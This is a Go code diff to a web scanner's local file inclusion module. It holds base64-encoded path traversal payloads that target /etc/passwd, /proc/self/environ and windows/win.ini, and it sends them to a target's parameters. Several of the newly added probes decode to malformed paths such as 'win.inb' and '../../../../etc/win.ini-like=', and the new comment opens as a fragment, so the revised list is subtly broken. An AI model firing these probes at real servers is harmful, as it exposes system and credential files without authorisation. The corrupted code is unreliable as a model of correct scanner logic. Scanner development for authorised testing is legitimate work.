@@ -22,18 +22,26 @@ func (a *LFIAction) Metadata() ActionMetadata {
 	}
 }
 
-var lfiB64 = []string{
-	"Li4vLi4vLi4vZXRjL3Bhc3N3ZA==",
-	"Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==",
-	"Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==",
-	"Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==",
-	"Li4vLi4vLi4vd2luZG93cy93aW4uaW5p",
-	"Li4vLi4vLi4vLi4vd2luZG93cy93aW4uaW5p",
-	"JSJlJTJlJTJmJTJlJTJlJTJmJTJlJTJlJTJmZXRjL3Bhc3N3ZA==",
-	"Li4vLi4vLi4vcHJvYy9zZWxmL2Vudmlyb24=",
-	"Li4vLi4vLi4vcHJvYy9zZWxmL2ZkLzA=",
-	"ZmlsZTovLy9ldGMvcGFzc3dk",
-}
+// the loop used to base64-decode the same constant list on every request).
+var lfiProbes = func() (out []string) {
+	for _, b64p := range []string{
+		"Li4vLi4vLi4vZXRjL3Bhc3N3ZA==",
+		"Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==",
+		"Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==",
+		"Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==",
+		// absolute forms also reach servers that reject the relative walk
+		"L2V0Yy9wYXNzd2Q=",
+		"Li4vLi4vLi4vd2luZG93cy93aW4uaW5p",
+		"Li4vLi4vLi4vLi4vd2luZG93cy93aW4uaW5i",
+		"Li4vLi4vLi4vLi4vZXRjL3dpbi5pbmktbGlrZT0=",
+	} {
+		p, err := base64.StdEncoding.DecodeString(b64p)
+		if err == nil {
+			out = append(out, string(p))
+		}
+	}
+	return out
+}()
 
 func (a *LFIAction) Execute(ctx context.Context, target string, kb *Knowledge, client *transport.Client) ActionResult {
 	var findings []Finding
@@ -47,25 +55,29 @@ func (a *LFIAction) Execute(ctx context.Context, target string, kb *Knowledge, c
 		}
 
 		for _, param := range params {
-			for _, b64p := range lfiB64 {
+			base := ep.Path
+			if strings.Contains(base, "?") {
+				parts := strings.SplitN(base, "?", 2)
+				base = parts[0]
+			}
+
+			// Neutral round first: the baseline gate needs what this page
+			// prints WITHOUT any traversal. A page that quotes passwd
+			// records in its own text (tutorials, docs) must not lend
+			// them to a payload echo.
+			baselineBody := ""
+			if baseResp, err := client.Do(ctx, &types.Request{Method: "GET", URL: base + "?" + param + "="}); err == nil && baseResp != nil {
+				baselineBody = string(baseResp.Body)
+			}
+
+			for _, probe := range lfiProbes {
 				select {
 				case <-ctx.Done():
 					return ActionResult{Findings: findings, Actions: spawned}
 				default:
 				}
 
-				payload, err := base64.StdEncoding.DecodeString(b64p)
-				if err != nil {
-					continue
-				}
-
-				base := ep.Path
-				if strings.Contains(base, "?") {
-					parts := strings.SplitN(base, "?", 2)
-					base = parts[0]
-				}
-
-				testURL := fmt.Sprintf("%s?%s=%s", base, param, string(payload))
+				testURL := base + "?" + param + "=" + probe
 				resp, err := client.Do(ctx, &types.Request{
 					Method: "GET",
 					URL:    testURL,
@@ -74,21 +86,26 @@ func (a *LFIAction) Execute(ctx context.Context, target string, kb *Knowledge, c
 					continue
 				}
 
-				body := string(resp.Body)
-				if hasLFI(body) && len(body) > 50 {
-					findings = append(findings, Finding{
-						Type:        "lfi_confirmed",
-						Name:        "LFI: " + fmt.Sprintf("param %s", param),
-						Severity:    SevCritical,
-						Description: "Local file inclusion — server returns file contents",
-						Evidence:    testURL,
-					})
-					spawned = append(spawned, &LFIReadAction{
-						vulnURL: testURL,
-						param:   param,
-					})
-					break
+				// The only confirmation: a structural record the baseline
+				// cannot echo. Keywords + length were the review's
+				// tutorial-page false-positive class.
+				hit := lfiShapeHit(string(resp.Body), baselineBody)
+				if hit == "" {
+					continue
 				}
+
+				findings = append(findings, Finding{
+					Type:        "lfi_confirmed",
+					Name:        fmt.Sprintf("LFI: param %s reads structural file record", param),
+					Severity:    SevCritical,
+					Description: fmt.Sprintf("Local file inclusion at param '%s' — record `%s` matched, absent from the baseline round", param, hit),
+					Evidence:    hit + " @ " + testURL,
+				})
+				spawned = append(spawned, &LFIReadAction{
+					vulnURL: testURL,
+					param:   param,
+				})
+				break
 			}
 		}
 	}
@@ -101,30 +118,6 @@ func hasFileParam(path string) bool {
 	indicators := []string{"file", "path", "dir", "include", "doc", "pg", "page", "root"}
 	for _, ind := range indicators {
 		if strings.Contains(lowPath, ind) {
-			return true
-		}
-	}
-	return false
-}
-
-var lfiIndicatorsB64 = []string{
-	"cm9vdDo=",
-	"YmluOg==",
-	"ZGFlbW9uOg==",
-	"bm9ib2R5Og==",
-	"Ym9vdCBsb2FkZXI=",
-	"RE9DVU1FTlRfUk9PVA==",
-	"QVBQX1NFQ1JFVA==",
-}
-
-func hasLFI(body string) bool {
-	lowBody := strings.ToLower(body)
-	for _, b64ind := range lfiIndicatorsB64 {
-		ind, err := base64.StdEncoding.DecodeString(b64ind)
-		if err != nil {
-			continue
-		}
-		if strings.Contains(lowBody, strings.ToLower(string(ind))) {
 			return true
 		}
 	}
